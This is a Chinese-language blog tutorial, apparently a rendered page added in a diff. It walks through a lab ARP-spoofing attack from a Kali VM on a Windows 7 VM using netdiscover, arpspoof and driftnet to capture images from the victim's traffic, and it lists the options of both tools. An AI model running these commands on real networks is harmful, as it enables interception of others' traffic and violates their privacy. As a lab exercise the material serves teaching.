@@ -1,0 +1,118 @@
+I"Q<p>攻击前准备：</p>
+
+<ol>
+  <li>
+    <p>一台Kali虚拟机作为attacker</p>
+  </li>
+  <li>
+    <p>一台win7虚拟机作为victim</p>
+  </li>
+  <li>
+    <p>win7虚拟机开桥接模式，模拟以太网连接。</p>
+  </li>
+  <li>
+    <p>用到的主要命令：</p>
+
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>arpspoof
+driftnet
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="step1扫描局域网内主机">Step1：扫描局域网内主机</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>netdiscover <span class="nt">-r</span> 192.168.199.0/24 <span class="c">#扫描范围</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/HYCBlog/assets/img/security/security_netdiscover.png" alt="security_netdiscover" /></p>
+
+<p>观察结果，推断出网关IP为<code class="language-plaintext highlighter-rouge">192.168.199.1</code>，目标主机地址为<code class="language-plaintext highlighter-rouge">192.168.199.169</code>。具体如何推断出目标主机的IP，可以从电脑型号以及当前的活跃情况推断。其实大多数attacker不会在乎自己攻击的是哪个特定主机，会在能力范围内把所有主机攻瘫。</p>
+
+<h2 id="step2arp欺骗">Step2：arp欺骗</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>arpspoof <span class="nt">-i</span> eth0 <span class="nt">-t</span> 192.168.199.1<span class="o">(</span>网关<span class="o">)</span> 192.168.199.169<span class="o">(</span>目标主机<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>在运行arpspoof之前，需要执行以下安装，否则会报<code class="language-plaintext highlighter-rouge">command not found</code></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>apt-get <span class="nb">install </span>dsniff
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/HYCBlog/assets/img/security/security_arpspoof.png" alt="security_arpspoof" /></p>
+
+<p>出现上述界面代表劫持成功。</p>
+
+<h2 id="step3测试结果">Step3：测试结果</h2>
+
+<p>在win7主机上通过Internet查看图片，利用driftnet工具将流经kali虚拟机的图片抓取，并显示在kali上。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>driftnet <span class="nt">-t</span> eth0
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/HYCBlog/assets/img/security/security_driftnet.png" alt="security_driftnet" /></p>
+
+<p>抓取成功。</p>
+
+<p>至此，win7已被kali实现arp劫持。</p>
+
+<p>Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>主要参数
+-i，--interface要使用的网络接口，作为参数给出。 如果不使用此选项，则该接口默认为第一个正在运行的非环回接口。
+-r，--repeat以参数指定的秒数为单位连续重新发送数据包。 延迟为零表示仅发送一个数据包。
+-a，--attacker-ip选择另一台计算机（运行该程序的计算机除外）作为要伪装的计算机。
+-g，--gateway-ip欺骗默认网关以外的IP（作为参数）。
+-v，--verbose打印有关所涉及机器的额外信息。
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Driftnet工具：Driftnet监视网络流量，抓取网络流量中的JPEG和GIF图像。这侵犯了人们的隐私，无论何时何地我们都不能这么做。除此之外，它还可以从网络中提取MPEG音频数据。</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>语法： driftnet   [options]   [filter code]
+主要参数：
+ -b               捕获到新的图片时发出嘟嘟声
+-i  interface     选择监听接口
+-f  file   读取一个指定pcap数据包中的图片
+-p  不让所监听的接口使用混杂模式
+-a  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）
+-m number 指定保存图片数的数目
+-d directory  指定保存图片的路径
+-x prefix  指定保存图片的前缀名
+使用举例：
+<span class="p">1.</span>实时监听： driftnet -i wlan0
+<span class="p">2.</span>读取一个指定pcap数据包中的图片： driftnet -f /home/linger/backup/ap.pcapng -a -d /root/drifnet/
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>参考：</p>
+
+<p><a href="https://github.com/smikims/arpspoof">arpspoof</a></p>
+
+<p><a href="https://xz.aliyun.com/t/4001">安全工具——Driftnet与ARP中毒的结合应用</a></p>
+
+<p><a href="https://www.cnblogs.com/lingerhk/p/4065956.html">图片捕获工具driftnet</a></p>
+
+:ET
